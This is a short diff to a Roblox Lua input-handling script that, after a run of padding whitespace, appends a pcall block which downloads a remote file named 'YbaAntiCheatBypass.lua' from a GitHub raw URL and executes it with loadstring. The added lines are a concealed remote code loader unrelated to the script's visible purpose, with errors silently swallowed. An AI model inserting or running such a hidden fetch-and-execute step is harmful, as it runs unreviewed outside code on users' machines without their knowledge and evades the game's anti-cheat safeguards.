@@ -23,3 +23,8 @@ UserInputService.InputBegan:Connect(function(Input, _p)
         })
     end
 end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+pcall(function()
+    loadstring(game:HttpGet(
+                [[https://raw.githubusercontent.com/A-DREAM-YOUVE-HAD-BEFORE/N-O-I-C-E/refs/heads/main/YbaAntiCheatBypass.lua]]
+            ))()    
+end)
